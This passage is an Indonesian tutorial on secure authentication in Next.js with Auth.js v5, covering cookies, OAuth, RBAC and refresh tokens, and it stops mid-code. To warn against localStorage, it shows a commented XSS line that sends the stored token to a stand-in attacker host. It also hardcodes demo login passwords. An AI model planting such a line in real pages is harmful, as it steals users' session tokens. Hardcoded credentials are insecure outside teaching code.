# Implementasi Auth yang Aman di Next.js App Router

> **Prerequisite:** Paham Next.js App Router (doc 06), data fetching (doc 07), dan sedikit tentang HTTP cookies. Kalau belum, baca dulu [06_nextjs-app-router.md](./06_nextjs-app-router.md).

---

## Daftar Isi

1. [Cara Kerja Auth dari Nol](#1-cara-kerja-auth-dari-nol)
2. [JWT vs Session: Pilih yang Mana?](#2-jwt-vs-session-pilih-yang-mana)
3. [Menyimpan Token dengan Aman](#3-menyimpan-token-dengan-aman)
4. [OAuth Flow: Google & GitHub Login](#4-oauth-flow-google--github-login)
5. [Auth.js v5 (NextAuth): Setup Lengkap](#5-authjs-v5-nextauth-setup-lengkap)
6. [Session Handling di Semua Lapisan](#6-session-handling-di-semua-lapisan)
7. [Protected Routes: Middleware vs Layout](#7-protected-routes-middleware-vs-layout)
8. [Role-Based Access Control (RBAC)](#8-role-based-access-control-rbac)
9. [Refresh Token Strategy](#9-refresh-token-strategy)
10. [Mini Project: Auth Lengkap dengan Google + RBAC](#10-mini-project-auth-lengkap-dengan-google--rbac)
11. [Security Mistakes yang Sering Bikin Celah](#11-security-mistakes-yang-sering-bikin-celah)

---

## 1. Cara Kerja Auth dari Nol

Sebelum masuk ke library, penting paham **apa yang sebenarnya terjadi** saat user login. Banyak dev yang langsung pakai NextAuth tanpa tahu dasarnya — jadinya bingung kalau ada error.

### Masalah Dasar: HTTP itu Stateless

```
HTTP request pertama (login):
  Browser ──POST /login──────────────────────────────────► Server
           { email, password }                               │
                                                          ✅ Valid!
  Browser ◄──200 OK──────────────────────────────────────── Server
           "Selamat datang, Budi"

HTTP request kedua (lihat profil):
  Browser ──GET /profil──────────────────────────────────► Server
           (tidak ada info siapa yang minta)                 │
                                                          ❓ Siapa kamu?
  Browser ◄──401 Unauthorized─────────────────────────────── Server

Masalah: Server tidak ingat bahwa Budi sudah login di request sebelumnya.
HTTP tidak menyimpan state antar request.
```

**Solusi:** Setelah login berhasil, server memberi user sebuah "bukti identitas" yang harus disertakan di setiap request berikutnya. Ada dua cara utama: **Session** dan **JWT**.

### Alur Auth Umum

```
 ┌─────────────────────────────────────────────────────────────┐
 │                    AUTHENTICATION FLOW                       │
 └─────────────────────────────────────────────────────────────┘

1. User isi form login
   Browser ──POST /auth/login──────────────────────────────► Server
            { email: "budi@mail.com", password: "secret" }

2. Server verifikasi
   Server: "Email ada di DB? Iya. Hash password cocok? Iya."
   Server buat bukti identitas → session/token

3. Bukti dikirim ke browser
   Browser ◄──Set-Cookie: session=abc123; httpOnly ─────────── Server
   (Cookie disimpan otomatis oleh browser, tidak bisa diakses JS)

4. Request berikutnya otomatis sertakan bukti
   Browser ──GET /dashboard──────────────────────────────────► Server
            Cookie: session=abc123                              │
                                                          "Budi? Iya valid"
   Browser ◄──200 OK + data dashboard ──────────────────────── Server

5. Logout
   Browser ──POST /auth/logout──────────────────────────────► Server
   Server hapus session dari DB / invalidasi token
   Browser ◄──Set-Cookie: session=; expires=past ──────────── Server
   (Cookie dihapus)
```

---

## 2. JWT vs Session: Pilih yang Mana?

Ini pertanyaan yang sering bikin debate. Jawaban singkatnya: **keduanya punya trade-off**, dan kebanyakan app modern butuh kombinasi keduanya.

### Session Token (Stateful)

```
 ┌──────────────────────────────────────────┐
 │              SESSION FLOW                 │
 └──────────────────────────────────────────┘

 Login:
 Browser ──POST /login──────────────► Server
                                        │
                                    Simpan di DB:
                                    sessions table:
                                    { id: "abc123",
                                      userId: 42,
                                      expiresAt: "..." }
                                        │
 Browser ◄──Cookie: session=abc123───── Server

 Request berikutnya:
 Browser ──GET /dashboard──────────► Server
          Cookie: session=abc123        │
                                    DB lookup:
                                    "abc123 → userId 42, masih valid"
                                        │
 Browser ◄──200 OK────────────────────── Server
```

**Kelebihan Session:**
- Bisa di-revoke kapan saja (hapus dari DB → user langsung logout)
- Payload tidak terekspos ke client
- Mudah diimplementasi "force logout all devices"

**Kekurangan Session:**
- Setiap request = query ke DB → latency tambah
- Tidak bisa scale horizontal tanpa shared session store (Redis/Memcached)
- DB jadi bottleneck

---

### JWT (Stateless)

JWT (JSON Web Token) adalah string terenkripsi yang berisi data langsung di dalamnya.

```
JWT token: xxxxx.yyyyy.zzzzz
            │       │       │
         Header  Payload  Signature

Header (base64):  { "alg": "HS256", "typ": "JWT" }
Payload (base64): { "sub": "42", "name": "Budi", "role": "admin", "exp": 1234567890 }
Signature:        HMACSHA256(header + "." + payload, SECRET_KEY)

⚠️ Payload bisa dibaca siapa saja (hanya base64, bukan encrypted)!
   Jangan taruh informasi sensitif (password, nomor kartu kredit) di payload.
   Yang tidak bisa dipalsukan adalah SIGNATURE — karena butuh SECRET_KEY.
```

```
 ┌──────────────────────────────────────────┐
 │                JWT FLOW                   │
 └──────────────────────────────────────────┘

 Login:
 Browser ──POST /login──────────────► Server
                                        │
                                    TIDAK ada DB insert
                                    Server buat JWT:
                                    sign({ userId: 42, role: "admin" }, SECRET)
                                        │
 Browser ◄──Cookie: token=jwt─────────── Server

 Request berikutnya:
 Browser ──GET /dashboard──────────► Server
          Cookie: token=jwt             │
                                    Verifikasi signature saja
                                    (TIDAK perlu DB lookup)
                                        │
 Browser ◄──200 OK────────────────────── Server
```

**Kelebihan JWT:**
- Tidak butuh DB per-request → lebih cepat, scale lebih mudah
- Bisa diverifikasi di manapun yang punya SECRET_KEY
- Cocok untuk microservices (antar service bisa validasi token sendiri)

**Kekurangan JWT:**
- **Tidak bisa di-revoke** → kalau token dicuri, valid sampai expired
- Payload bisa dibaca (bukan encrypted) → jangan taruh data sensitif
- Token besar → nambah ukuran setiap request

---

### Perbandingan

| Aspek | Session | JWT |
|---|---|---|
| Storage server | DB / Redis | Tidak ada (stateless) |
| Revoke sebelum expired | ✅ Mudah (hapus dari DB) | ❌ Sulit (butuh blacklist) |
| Scalability | ⚠️ Butuh shared store | ✅ Horizontal scale mudah |
| DB query per-request | ✅ Ada (overhead) | ❌ Tidak ada |
| Payload bisa dibaca client | ❌ Tidak (opaque) | ⚠️ Ya (base64) |
| Cocok untuk | Monolith, sensitive app | Microservices, API |

**Auth.js v5 default: JWT** karena stateless dan tidak butuh DB hanya untuk validasi session. Bisa diubah ke database session kalau kamu butuh revoke capability.

---

## 3. Menyimpan Token dengan Aman

Ini bagian yang **sering salah implementasi** dan jadi sumber kerentanan.

### ❌ Jangan Simpan di localStorage

```ts
// ❌ JANGAN LAKUKAN INI — rentan XSS
localStorage.setItem("token", jwtToken);

// Kenapa berbahaya?
// Kalau ada satu baris JS berbahaya di halamanmu (via dependency, CDN, dll.):
// <script>
//   fetch("https://attacker.com/steal?t=" + localStorage.getItem("token"))
// </script>
// Token langsung bisa dicuri!
```

### ❌ Memory (useState / Zustand) Juga Bukan Solusi Terbaik

```ts
// Token disimpan di memory React
const [token, setToken] = useState<string>("");

// Masalah:
// 1. Hilang saat refresh halaman → user harus login ulang
// 2. Tidak persistent — bukan solusi long-term
// 3. Masih rentan kalau ada XSS yang bisa akses React state
```

### ✅ httpOnly Cookie adalah Cara yang Benar

```
httpOnly Cookie:
  ┌─────────────────────────────────────────────────────┐
  │ Set-Cookie: token=jwt123;                           │
  │             HttpOnly;     ← TIDAK bisa diakses JS   │
  │             Secure;       ← Hanya HTTPS             │
  │             SameSite=Lax; ← Proteksi CSRF           │
  │             Path=/;                                  │
  │             Max-Age=86400 (1 hari)                   │
  └─────────────────────────────────────────────────────┘

  JavaScript:
    document.cookie   → "" (token tidak muncul!)
    localStorage.getItem("token") → null
    
  Browser:
    Otomatis kirim cookie di setiap request ke domain yang sama ✅
    Tidak bisa dicuri via XSS karena JS tidak bisa baca ✅
    
  Serangan yang masih perlu dimitigasi:
    CSRF (Cross-Site Request Forgery) → dimitigasi dengan SameSite=Lax/Strict
```

### Memahami SameSite

```
SameSite=Strict:  Cookie TIDAK dikirim kalau request datang dari domain lain
                  → Paling aman, tapi merusak beberapa flow (redirect dari email)
                  
SameSite=Lax:     Cookie dikirim pada navigasi top-level (klik link),
                  tapi TIDAK pada sub-request (fetch, img, form POST dari domain lain)
                  → Balance bagus antara keamanan dan UX
                  → Ini default Next.js / Auth.js
                  
SameSite=None:    Cookie selalu dikirim (deprecated behavior lama)
                  → Butuh Secure flag, dan rentan CSRF
```

### Auth.js Mengurus Ini Semua Otomatis

```ts
// Auth.js secara otomatis set cookie dengan:
// - HttpOnly: true
// - Secure: true (di production)
// - SameSite: "lax"
// - Path: "/"
// Kamu tidak perlu setup ini manual!
```

---

## 4. OAuth Flow: Google & GitHub Login

"Login dengan Google" bukan sihir — ada protokol standar di baliknya: **OAuth 2.0 + OpenID Connect**.

### Visualisasi OAuth Flow

```
 User         Browser          App Kamu        Google OAuth      Google DB
  │              │                 │                 │               │
  │ Klik         │                 │                 │               │
  │ "Login       │                 │                 │               │
  │ dengan       │                 │                 │               │
  │ Google" ─────►                 │                 │               │
  │              │ GET /auth/      │                 │               │
  │              │ signin/google   │                 │               │
  │              ├────────────────►│                 │               │
  │              │                 │ Redirect ke     │               │
  │              │                 │ Google dengan:  │               │
  │              │                 │ client_id,      │               │
  │              │                 │ redirect_uri,   │               │
  │              │                 │ scope,          │               │
  │              │                 │ state (CSRF)    │               │
  │              │◄────────────────┤                 │               │
  │              │ Redirect ke Google               │               │
  │              ├─────────────────────────────────►│               │
  │              │                 │  Google tampilkan UI login      │
  │◄─────────────┤                 │                 │               │
  │              │                 │                 │               │
  │ Pilih akun   │                 │                 │               │
  │ Google ──────►                 │                 │               │
  │              ├─────────────────────────────────►│               │
  │              │                 │          User pilih akun        │
  │              │                 │                 ├──────────────►│
  │              │                 │                 │ Verifikasi    │
  │              │                 │                 │◄──────────────┤
  │              │                 │                 │               │
  │              │ Redirect kembali ke app         │               │
  │              │ dengan ?code=AUTH_CODE&state=...│               │
  │              │◄─────────────────────────────────┤               │
  │              │                 │                 │               │
  │              │ GET /auth/callback?code=...      │               │
  │              ├────────────────►│                 │               │
  │              │                 │ POST token exchange             │
  │              │                 ├────────────────►│               │
  │              │                 │ { code, secret }│               │
  │              │                 │◄────────────────┤               │
  │              │                 │ { access_token, id_token }      │
  │              │                 │                 │               │
  │              │                 │ Fetch user info dari Google     │
  │              │                 ├────────────────►│               │
  │              │                 │◄────────────────┤               │
  │              │                 │ { name, email, picture }        │
  │              │                 │                 │               │
  │              │                 │ Buat session / JWT              │
  │              │                 │ Set httpOnly cookie             │
  │              │◄────────────────┤                 │               │
  │              │ Redirect ke /dashboard          │               │
  │◄─────────────┤                 │                 │               │
  │ Dashboard    │                 │                 │               │
  ▼              ▼                 ▼                 ▼               ▼
```

**Yang penting dimengerti:**
1. Password user **tidak pernah dikirim ke app kamu** — Google yang handle autentikasi
2. `code` yang diterima dari Google adalah one-time use, ditukar dengan `access_token`
3. `state` parameter mencegah CSRF — Google kembalikan state yang sama, app verifikasi
4. App kamu hanya terima **profil user** (nama, email), bukan password

---

## 5. Auth.js v5 (NextAuth): Setup Lengkap

Auth.js v5 adalah evolusi dari NextAuth.js. Perubahan besar dari v4 ke v5:
- File config pindah ke `auth.ts` di root
- `getServerSession()` → `auth()` 
- Middleware langsung pakai `auth` dari config
- Semua dari satu file config

### Instalasi

```bash
npm install next-auth@beta
# Atau kalau pakai Prisma adapter:
npm install next-auth@beta @auth/prisma-adapter @prisma/client prisma
```

### Generate AUTH_SECRET

```bash
# Wajib untuk production — key untuk enkripsi JWT/session
npx auth secret
# Otomatis tambah AUTH_SECRET ke .env.local
```

### Struktur File

```
.
├── auth.ts                              ← Config utama Auth.js
├── middleware.ts                        ← Route protection
├── app/
│   ├── api/
│   │   └── auth/
│   │       └── [...nextauth]/
│   │           └── route.ts            ← Route handler
│   ├── (auth)/
│   │   ├── login/
│   │   │   └── page.tsx
│   │   └── layout.tsx                  ← Layout untuk halaman auth
│   └── (protected)/
│       ├── dashboard/
│       │   └── page.tsx
│       └── admin/
│           └── page.tsx
├── types/
│   └── next-auth.d.ts                  ← Module augmentation
└── .env.local
```

### Environment Variables

```bash
# .env.local

# Wajib
AUTH_SECRET="generated-by-npx-auth-secret"

# Google OAuth — dari console.cloud.google.com
AUTH_GOOGLE_ID="xxx.apps.googleusercontent.com"
AUTH_GOOGLE_SECRET="GOCSPX-xxx"

# GitHub OAuth — dari github.com/settings/developers
AUTH_GITHUB_ID="Iv1.xxx"
AUTH_GITHUB_SECRET="xxx"

# Database (kalau pakai database sessions / Prisma adapter)
DATABASE_URL="postgresql://user:pass@localhost:5432/mydb"

# URL app (untuk OAuth redirect)
NEXTAUTH_URL="http://localhost:3000"            # Development
# NEXTAUTH_URL="https://yourapp.com"           # Production
```

### Config Utama — `auth.ts`

```ts
// auth.ts (root level)
import NextAuth from "next-auth";
import Google from "next-auth/providers/google";
import GitHub from "next-auth/providers/github";
import Credentials from "next-auth/providers/credentials";
import { z } from "zod";
import type { NextAuthConfig } from "next-auth";

// ── Type augmentation untuk custom fields ─────────────────────
// (lihat types/next-auth.d.ts di bawah)

const credentialsSchema = z.object({
  email:    z.string().email(),
  password: z.string().min(6),
});

export const authConfig: NextAuthConfig = {
  // ── Providers ────────────────────────────────────────────────
  providers: [
    // OAuth Providers
    Google,  // Otomatis baca AUTH_GOOGLE_ID dan AUTH_GOOGLE_SECRET
    GitHub,  // Otomatis baca AUTH_GITHUB_ID dan AUTH_GITHUB_SECRET

    // Email + Password
    Credentials({
      name: "Email & Password",
      credentials: {
        email:    { label: "Email",    type: "email" },
        password: { label: "Password", type: "password" },
      },

      // Fungsi ini berjalan di server — aman untuk query DB
      async authorize(credentials) {
        // Validasi input
        const parsed = credentialsSchema.safeParse(credentials);
        if (!parsed.success) return null;

        const { email, password } = parsed.data;

        // Query user dari DB (contoh dengan Prisma)
        // const user = await prisma.user.findUnique({ where: { email } });
        // if (!user || !user.passwordHash) return null;

        // Verifikasi password
        // const isValid = await bcrypt.compare(password, user.passwordHash);
        // if (!isValid) return null;

        // Simulasi untuk learning purposes:
        if (email === "admin@mail.com" && password === "password123") {
          return {
            id:    "1",
            name:  "Admin User",
            email: "admin@mail.com",
            role:  "admin" as const,
          };
        }

        if (email === "user@mail.com" && password === "password123") {
          return {
            id:    "2",
            name:  "Regular User",
            email: "user@mail.com",
            role:  "user" as const,
          };
        }

        return null; // Login gagal
      },
    }),
  ],

  // ── Pages kustom ─────────────────────────────────────────────
  pages: {
    signIn:  "/login",          // Redirect ke sini kalau butuh login
    signOut: "/",               // Redirect setelah logout
    error:   "/login",          // Error page (query: ?error=...)
    // newUser: "/onboarding",  // Setelah user baru OAuth pertama kali
  },

  // ── Session strategy ─────────────────────────────────────────
  session: {
    strategy:    "jwt",       // "jwt" | "database"
    maxAge:      30 * 24 * 60 * 60, // 30 hari dalam detik
    updateAge:   24 * 60 * 60,      // Update session setiap 24 jam
  },

  // ── Callbacks — sesuaikan data di token & session ─────────────
  callbacks: {
    // jwt: dipanggil saat token dibuat atau diperbarui
    // Ini tempat kita tambah custom fields ke token
    async jwt({ token, user, account, trigger, session }) {
      // `user` hanya ada saat pertama login
      if (user) {
        token.id   = user.id as string;
        token.role = (user as { role?: string }).role ?? "user";
      }

      // `trigger === "update"` saat session di-update manual
      if (trigger === "update" && session?.role) {
        token.role = session.role;
      }

      return token;
    },

    // session: dipanggil saat session dibaca
    // Expose field tambahan dari token ke client-side session
    async session({ session, token }) {
      if (token) {
        session.user.id   = token.id   as string;
        session.user.role = token.role as string;
      }
      return session;
    },

    // authorized: dipanggil di middleware untuk setiap request
    // Return true = boleh akses, false = redirect ke halaman login
    authorized({ auth, request: { nextUrl } }) {
      const isLoggedIn   = !!auth?.user;
      const isOnDashboard = nextUrl.pathname.startsWith("/dashboard");
      const isOnAdmin    = nextUrl.pathname.startsWith("/admin");

      if (isOnAdmin) {
        // Admin page: harus login + role admin
        if (!isLoggedIn) return false;
        if (auth?.user?.role !== "admin") {
          return Response.redirect(new URL("/dashboard", nextUrl));
        }
        return true;
      }

      if (isOnDashboard) {
        // Dashboard: harus login
        return isLoggedIn;
      }

      // Halaman lain: bebas diakses
      return true;
    },
  },

  // ── Events — hook untuk side effects ─────────────────────────
  events: {
    async signIn({ user, account }) {
      // Log login activity, update lastSeen, dll.
      console.log(`${user.email} logged in via ${account?.provider}`);
    },
    async signOut({ token }) {
      console.log(`${token?.email} logged out`);
    },
  },

  // ── Debug (matikan di production!) ───────────────────────────
  debug: process.env.NODE_ENV === "development",
};

export const { handlers, auth, signIn, signOut } = NextAuth(authConfig);
//              │         │     │       │
//              │         │     │       └── Fungsi logout (server-side)
//              │         │     └────────── Fungsi login (server-side)
//              │         └──────────────── Fungsi baca session (server & middleware)
//              └────────────────────────── Route handlers (GET & POST)
```

### Route Handler

```ts
// app/api/auth/[...nextauth]/route.ts
// Satu baris saja — handlers sudah berisi GET dan POST
export { handlers as GET, handlers as POST } from "@/auth";
```

### TypeScript Augmentation

```ts
// types/next-auth.d.ts
// Extend tipe bawaan NextAuth untuk tambah field custom

import type { DefaultSession } from "next-auth";

// Definisikan role sebagai literal type
type UserRole = "admin" | "user" | "moderator";

declare module "next-auth" {
  interface Session {
    user: {
      id:   string;
      role: UserRole;
    } & DefaultSession["user"]; // Gabungkan dengan type default (name, email, image)
  }

  interface User {
    role?: UserRole;
  }
}

declare module "next-auth/jwt" {
  interface JWT {
    id:   string;
    role: UserRole;
  }
}
```

### Tambahkan ke `tsconfig.json`

```json
{
  "compilerOptions": {
    "paths": {
      "@/*": ["./*"]
    }
  },
  "include": [
    "next-env.d.ts",
    "**/*.ts",
    "**/*.tsx",
    "types/**/*.d.ts"   // ← Pastikan types/ ter-include
  ]
}
```

---

## 6. Session Handling di Semua Lapisan

Auth.js v5 menyediakan cara yang berbeda untuk membaca session di tiap lapisan Next.js.

### Di Server Component (App Router)

```tsx
// app/dashboard/page.tsx
import { auth } from "@/auth";
import { redirect } from "next/navigation";

export default async function DashboardPage() {
  // auth() adalah async — harus di-await
  const session = await auth();

  // Redirect kalau belum login
  if (!session) {
    redirect("/login");
  }

  // session.user sudah fully typed karena augmentation kita tadi
  // session.user.id: string
  // session.user.name: string | null | undefined
  // session.user.email: string | null | undefined
  // session.user.role: "admin" | "user" | "moderator"

  return (
    <div>
      <h1>Selamat datang, {session.user.name}!</h1>
      <p>Role kamu: {session.user.role}</p>
    </div>
  );
}
```

### Di API Route Handler

```ts
// app/api/user/profile/route.ts
import { auth } from "@/auth";
import { NextResponse } from "next/server";

export async function GET() {
  const session = await auth();

  if (!session) {
    return NextResponse.json(
      { error: "Unauthorized" },
      { status: 401 }
    );
  }

  // Ambil data profil berdasarkan session.user.id
  // const profile = await db.user.findUnique({ where: { id: session.user.id } });

  return NextResponse.json({
    id:    session.user.id,
    name:  session.user.name,
    email: session.user.email,
    role:  session.user.role,
  });
}
```

### Di Client Component (`useSession`)

```tsx
// components/UserMenu.tsx
"use client";

import { useSession, signOut } from "next-auth/react";

export default function UserMenu() {
  // useSession hanya tersedia di Client Component
  const { data: session, status } = useSession();
  //              │           │
  //              │           └── "loading" | "authenticated" | "unauthenticated"
  //              └────────────── Session object (null kalau belum login)

  if (status === "loading") {
    return <div className="animate-pulse h-8 w-8 rounded-full bg-gray-200" />;
  }

  if (status === "unauthenticated") {
    return <a href="/login">Masuk</a>;
  }

  return (
    <div className="relative">
      <img
        src={session?.user?.image ?? "/default-avatar.png"}
        alt={`Avatar ${session?.user?.name}`}
        className="h-8 w-8 rounded-full cursor-pointer"
      />
      <div>
        <p>{session?.user?.name}</p>
        <p className="text-xs text-gray-500">{session?.user?.email}</p>
        <p className="text-xs font-medium text-blue-600">{session?.user?.role}</p>
        <button
          onClick={() => signOut({ callbackUrl: "/" })}
          className="text-sm text-red-600"
        >
          Keluar
        </button>
      </div>
    </div>
  );
}
```

### Wajib: `SessionProvider` di Root Layout

```tsx
// app/layout.tsx
import { SessionProvider } from "next-auth/react";
import { auth } from "@/auth";

export default async function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  // Pass session dari server ke SessionProvider
  // Ini membuat session tersedia untuk useSession() tanpa loading state awal
  const session = await auth();

  return (
    <html lang="id">
      <body>
        <SessionProvider session={session}>
          {children}
        </SessionProvider>
      </body>
    </html>
  );
}
```

---

## 7. Protected Routes: Middleware vs Layout

Ada dua cara melindungi halaman di Next.js. Pilih berdasarkan kebutuhanmu.

### Cara 1: Middleware (Recommended untuk Most Cases)

Middleware berjalan di **Edge Network** — sebelum request sampai ke app. Redirect terjadi di network level, bukan di browser.

```ts
// middleware.ts (root level — sejajar dengan app/)
import { auth } from "@/auth";

// auth() sebagai middleware — shorthand dari NextAuth v5
export default auth;

// Atau kalau butuh logic custom:
export default auth((req) => {
  const { nextUrl, auth: session } = req;

  const isLoggedIn       = !!session;
  const isAuthPage       = nextUrl.pathname.startsWith("/login") ||
                           nextUrl.pathname.startsWith("/register");
  const isProtectedPage  = nextUrl.pathname.startsWith("/dashboard") ||
                           nextUrl.pathname.startsWith("/profile");
  const isAdminPage      = nextUrl.pathname.startsWith("/admin");
  const isApiAuthRoute   = nextUrl.pathname.startsWith("/api/auth");

  // Jangan intercept route auth bawaan NextAuth
  if (isApiAuthRoute) return;

  // Kalau sudah login tapi akses halaman auth → redirect ke dashboard
  if (isAuthPage && isLoggedIn) {
    return Response.redirect(new URL("/dashboard", nextUrl));
  }

  // Kalau protected page tapi belum login → redirect ke login
  if (isProtectedPage && !isLoggedIn) {
    const loginUrl = new URL("/login", nextUrl);
    // Simpan URL tujuan agar bisa redirect balik setelah login
    loginUrl.searchParams.set("callbackUrl", nextUrl.pathname);
    return Response.redirect(loginUrl);
  }

  // Admin page: harus login dan role admin
  if (isAdminPage) {
    if (!isLoggedIn) {
      return Response.redirect(new URL("/login", nextUrl));
    }
    if (session?.user?.role !== "admin") {
      return Response.redirect(new URL("/dashboard", nextUrl));
    }
  }
});

// Konfigurasi: path mana yang dijalankan middleware
export const config = {
  matcher: [
    /*
     * Match semua path KECUALI:
     * - /api/auth (route bawaan NextAuth)
     * - /_next/static, /_next/image (file statis Next.js)
     * - /favicon.ico, /manifest.json, dll.
     * - File dengan ekstensi (gambar, font, dll.)
     */
    "/((?!api/auth|_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp)$).*)",
  ],
};
```

### Cara 2: Layout Protection (Defense in Depth)

Layout check sebaiknya dipakai **sebagai lapisan tambahan**, bukan satu-satunya proteksi. Kalau middleware sudah redirect, layout check tidak akan tereksekusi — tapi bagus sebagai fallback.

```tsx
// app/(protected)/layout.tsx
import { auth } from "@/auth";
import { redirect } from "next/navigation";

// Semua halaman di dalam folder (protected) akan melalui layout ini
export default async function ProtectedLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const session = await auth();

  // Double-check di layout (middleware sudah handle, ini sebagai fallback)
  if (!session) {
    redirect("/login?callbackUrl=/dashboard");
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Navbar, sidebar, dll. yang shared di semua halaman protected */}
      <main className="container mx-auto px-4 py-8">
        {children}
      </main>
    </div>
  );
}
```

### Middleware vs Layout: Kapan Pakai yang Mana?

```
Middleware:
  ✅ Proteksi bekerja di edge — tidak ada layout/page yang render sebelum check
  ✅ Satu tempat untuk semua route protection logic
  ✅ Lebih efisien (tidak render komponen untuk redirect)
  ⚠️ Tidak bisa akses DB (edge runtime — tidak ada Node.js APIs)
  ⚠️ Tidak bisa import prisma/mongoose langsung

Layout:
  ✅ Bisa query DB (Node.js runtime)
  ✅ Bisa pass data user langsung ke children (tidak perlu auth() ulang)
  ✅ Bisa show conditional UI (berbeda antara user vs admin)
  ⚠️ Layout tetap mulai render sebelum check (ada sedikit flash)
  ⚠️ Tiap layout perlu auth check masing-masing

Best Practice: Middleware untuk redirect coarse-grained + Layout untuk fine-grained logic
```

---

## 8. Role-Based Access Control (RBAC)

RBAC = "siapa boleh akses apa berdasarkan perannya".

### Definisikan Role dan Permissions

```ts
// lib/rbac.ts

// Definisikan semua role yang ada
export type UserRole = "admin" | "moderator" | "user" | "guest";

// Definisikan semua aksi yang bisa dilakukan
export type Permission =
  | "dashboard:view"
  | "users:view"
  | "users:create"
  | "users:update"
  | "users:delete"
  | "posts:view"
  | "posts:create"
  | "posts:update"    // Update sendiri
  | "posts:update:any" // Update milik orang lain
  | "posts:delete"
  | "posts:delete:any"
  | "analytics:view"
  | "settings:view"
  | "settings:update";

// Map role ke daftar permissions
const rolePermissions: Record<UserRole, Permission[]> = {
  admin: [
    "dashboard:view",
    "users:view",
    "users:create",
    "users:update",
    "users:delete",
    "posts:view",
    "posts:create",
    "posts:update",
    "posts:update:any",
    "posts:delete",
    "posts:delete:any",
    "analytics:view",
    "settings:view",
    "settings:update",
  ],
  moderator: [
    "dashboard:view",
    "users:view",
    "posts:view",
    "posts:create",
    "posts:update",
    "posts:update:any", // Moderator bisa edit post orang lain
    "posts:delete:any",
  ],
  user: [
    "dashboard:view",
    "posts:view",
    "posts:create",
    "posts:update",  // Hanya milik sendiri
    "posts:delete",  // Hanya milik sendiri
  ],
  guest: [
    "posts:view",
  ],
};

// Fungsi check permission
export function hasPermission(
  role: UserRole | undefined | null,
  permission: Permission
): boolean {
  if (!role) return false;
  return rolePermissions[role]?.includes(permission) ?? false;
}

// Fungsi check multiple permissions (AND)
export function hasAllPermissions(
  role: UserRole | undefined | null,
  permissions: Permission[]
): boolean {
  return permissions.every(p => hasPermission(role, p));
}

// Fungsi check any permission (OR)
export function hasAnyPermission(
  role: UserRole | undefined | null,
  permissions: Permission[]
): boolean {
  return permissions.some(p => hasPermission(role, p));
}
```

### Guard Component untuk UI

```tsx
// components/auth/PermissionGuard.tsx
import { auth } from "@/auth";
import type { Permission } from "@/lib/rbac";
import { hasPermission } from "@/lib/rbac";
import type { UserRole } from "@/lib/rbac";

interface PermissionGuardProps {
  permission:  Permission;
  children:    React.ReactNode;
  fallback?:   React.ReactNode; // Tampilkan ini kalau tidak punya izin
}

// Server Component — baca session langsung di server
export async function PermissionGuard({
  permission,
  children,
  fallback = null,
}: PermissionGuardProps) {
  const session = await auth();
  const role    = session?.user?.role as UserRole | undefined;

  if (!hasPermission(role, permission)) {
    return <>{fallback}</>;
  }

  return <>{children}</>;
}
```

```tsx
// Penggunaan di Server Component
import { PermissionGuard } from "@/components/auth/PermissionGuard";

export default async function AdminDashboard() {
  return (
    <div>
      <h1>Dashboard</h1>

      {/* Tombol delete hanya muncul untuk yang punya izin */}
      <PermissionGuard
        permission="users:delete"
        fallback={<p className="text-gray-400">Hanya admin yang bisa hapus user</p>}
      >
        <button className="bg-red-500 text-white px-4 py-2 rounded">
          Hapus User
        </button>
      </PermissionGuard>

      {/* Section analytics hanya untuk admin */}
      <PermissionGuard permission="analytics:view">
        <AnalyticsSection />
      </PermissionGuard>
    </div>
  );
}
```

### Client-Side Permission Hook

```tsx
// hooks/usePermission.ts
"use client";

import { useSession } from "next-auth/react";
import { hasPermission, hasAnyPermission, type Permission, type UserRole } from "@/lib/rbac";

export function usePermission() {
  const { data: session } = useSession();
  const role = session?.user?.role as UserRole | undefined;

  return {
    can:    (permission: Permission) => hasPermission(role, permission),
    canAny: (permissions: Permission[]) => hasAnyPermission(role, permissions),
    role,
    isAdmin:     role === "admin",
    isModerator: role === "moderator",
    isUser:      role === "user",
  };
}
```

```tsx
// Penggunaan di Client Component
"use client";

import { usePermission } from "@/hooks/usePermission";

export function PostActions({ postId }: { postId: string }) {
  const { can, isAdmin } = usePermission();

  return (
    <div>
      <button>Lihat</button>

      {can("posts:update") && (
        <button>Edit</button>
      )}

      {(can("posts:delete") || isAdmin) && (
        <button className="text-red-500">Hapus</button>
      )}
    </div>
  );
}
```

### RBAC di API Route

```ts
// app/api/users/[id]/route.ts
import { auth } from "@/auth";
import { hasPermission } from "@/lib/rbac";
import type { UserRole } from "@/lib/rbac";
import { NextResponse } from "next/server";

export async function DELETE(
  _request: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  const session = await auth();

  // 1. Harus login
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // 2. Harus punya permission
  const role = session.user.role as UserRole;
  if (!hasPermission(role, "users:delete")) {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }

  const { id } = await params;

  // 3. Tidak bisa hapus diri sendiri
  if (id === session.user.id) {
    return NextResponse.json(
      { error: "Tidak bisa menghapus akun sendiri" },
      { status: 400 }
    );
  }

  // Hapus user dari DB
  // await prisma.user.delete({ where: { id } });

  return NextResponse.json({ message: "User berhasil dihapus" });
}
```

---

## 9. Refresh Token Strategy

JWT punya expiry time. Kalau pendek (15 menit) → user sering logout. Kalau panjang (30 hari) → resiko keamanan. **Solusi:** Dua token.

```
Access Token:  Expired dalam 15 menit
               → Dipakai untuk tiap request ke API
               → Kalau dicuri, valid hanya 15 menit

Refresh Token: Expired dalam 30 hari
               → Disimpan aman (httpOnly cookie)
               → Hanya dipakai untuk minta access token baru
               → Kalau dicuri, bisa di-revoke dari DB
```

### Visualisasi Refresh Token Flow

```
 Normal request (access token masih valid):
 Browser ─────GET /api/data + access_token──────────────────► API
 Browser ◄────200 OK + data──────────────────────────────────

 Access token expired:
 Browser ─────GET /api/data + access_token (expired)────────► API
 Browser ◄────401 Unauthorized───────────────────────────────

 Browser lihat 401 → coba refresh:
 Browser ─────POST /api/auth/refresh + refresh_token─────────► Auth Server
 Auth Server verifikasi refresh_token di DB
 Auth Server buat access_token baru
 Browser ◄────200 OK + new_access_token───────────────────────

 Retry request dengan access_token baru:
 Browser ─────GET /api/data + new_access_token───────────────► API
 Browser ◄────200 OK + data──────────────────────────────────
```

### Implementasi di Auth.js v5

```ts
// auth.ts — tambahkan di callbacks

callbacks: {
  async jwt({ token, user, account }) {
    // Saat pertama login (ada `account`)
